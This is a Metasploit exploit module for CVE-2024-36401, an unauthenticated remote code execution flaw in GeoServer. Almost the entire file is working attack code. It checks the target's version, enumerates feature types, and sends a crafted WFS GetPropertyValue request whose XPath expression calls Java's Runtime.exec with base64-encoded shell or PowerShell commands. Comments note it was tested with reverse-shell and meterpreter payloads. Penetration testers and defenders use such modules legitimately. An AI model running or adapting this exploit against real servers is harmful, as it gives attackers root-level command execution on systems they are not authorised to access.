##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Geoserver unauthenticated Remote Code Execution',
        'Description' => %q{
          GeoServer is an open-source software server written in Java that provides
          the ability to view, edit, and share geospatial data.
          It is designed to be a flexible, efficient solution for distributing geospatial data
          from a variety of sources such as Geographic Information System (GIS) databases,
          web-based data, and personal datasets.
          In the GeoServer versions < 2.23.6, >= 2.24.0, < 2.24.4 and >= 2.25.0, < 2.25.1,
          multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users
          through specially crafted input against a default GeoServer installation due to unsafely
          evaluating property names as XPath expressions.
          An attacker can abuse this by sending a POST request with a malicious xpath expression
          to execute arbitrary commands as root on the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'jheysel-r7', # MSF module Windows support
          'Steve Ikeoka', # Discovery
          'Valentin Lobstein a.k.a chocapikk' # Dynamic featuretype code enhancement
        ],
        'References' => [
          ['CVE', '2024-36401'],
          ['URL', 'https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv'],
          ['URL', 'https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401'],
          ['URL', 'https://attackerkb.com/topics/W6IDY2mmp9/cve-2024-36401'],
          ['URL', 'https://github.com/Chocapikk/CVE-2024-36401']
        ],
        'DisclosureDate' => '2024-07-01',
        'Platform' => ['unix', 'linux', 'windows'],
        'Arch' => [ARCH_CMD],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => ['windows'],
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd
              # Tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8080,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path of the GeoServer web application', '/'])
      ]
    )
  end

  def check_version
    print_status('Trying to detect if target is running a vulnerable version of GeoServer.')
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'geoserver', 'web', 'wicket', 'bookmarkable', 'org.geoserver.web.AboutGeoServerPage'),
      'keep_cookies' => true,
      'method' => 'GET'
    })
    return nil unless res&.code == 200 && res.body.include?('GeoServer Version')

    html = res.get_html_document
    unless html.blank?
      # html identifier for Geoserver version information: <span id="version">2.23.2</span>
      version = html.css('span[id="version"]')
      return Rex::Version.new(version[0].text) unless version[0].nil?
    end
    nil
  end

  def get_valid_featuretype
    # get a list of available feature types and test if the feature type is supporting the RCE
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'geoserver', 'wfs'),
      'method' => 'GET',
      'ctype' => 'application/xml',
      'keep_cookies' => true,
      'vars_get' => {
        'request' => 'ListStoredQueries',
        'service' => 'wfs'
      }
    })
    return nil unless res&.code == 200 && res.body.include?('ListStoredQueriesResponse')

    xml = res.get_xml_document
    unless xml.blank?
      xml.remove_namespaces!
      # get all the FeatureTypes and store them in an array of strings
      retrieved_feature_types = xml.xpath('//ReturnFeatureType')
      # shuffle the retrieved_feature_types array, and loop through the list of retrieved_feature_types from GeoServer
      # test and return the feature type if an RCE is possible
      retrieved_feature_types.to_a.shuffle.each do |feature_type|
        return feature_type.text if execute_command('whoami', feature_type.text)
      end
    end
    nil
  end

  def create_payload(cmd, feature_type)
    case target['Type']
    when :unix_cmd
      # create customised b64 encoded payload
      # 'Encoder' => 'cmd/base64' does not work in this particular use case
      enc_cmd_b64 = Base64.strict_encode64(cmd)
      cmd = "sh -c echo${IFS}#{enc_cmd_b64}|base64${IFS}-d|sh"
    when :win_cmd
      enc_cmd_b64 = Base64.strict_encode64("cmd /C --% #{cmd}".encode('UTF-16LE'))
      cmd = "powershell.exe -e #{enc_cmd_b64}"
    end

    return <<~EOS
      <wfs:GetPropertyValue service='WFS' version='2.0.0'
        xmlns:topp='http://www.openplans.org/topp'
        xmlns:fes='http://www.opengis.net/fes/2.0'
        xmlns:wfs='http://www.opengis.net/wfs/2.0'>
          <wfs:Query typeNames="#{feature_type}"/>
          <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "#{cmd}")</wfs:valueReference>
      </wfs:GetPropertyValue>
    EOS
  end

  def execute_command(cmd, feature_type, _opts = {})
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'geoserver', 'wfs'),
      'method' => 'POST',
      'ctype' => 'application/xml',
      'keep_cookies' => true,
      'data' => create_payload(cmd, feature_type)
    })
    return false unless res&.code == 400 && res.body.include?('ClassCastException')

    true
  end

  def check
    version_number = check_version
    return CheckCode::Unknown('Could not retrieve the version information.') if version_number.nil?
    return CheckCode::Appears("Version #{version_number}") if version_number.between?(Rex::Version.new('2.25.0'), Rex::Version.new('2.25.1')) || version_number.between?(Rex::Version.new('2.24.0'), Rex::Version.new('2.24.3')) || version_number < Rex::Version.new('2.23.6')

    CheckCode::Safe("Version #{version_number}")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd, :win_cmd
      valid_feature_type = get_valid_featuretype
      fail_with(Failure::NotFound, 'No valid featuretype found to estabish the RCE.') if valid_feature_type.nil?
      fail_with(Failure::PayloadFailed, 'Payload execution failed.') unless execute_command(payload.encoded, valid_feature_type)
    end
  end
end
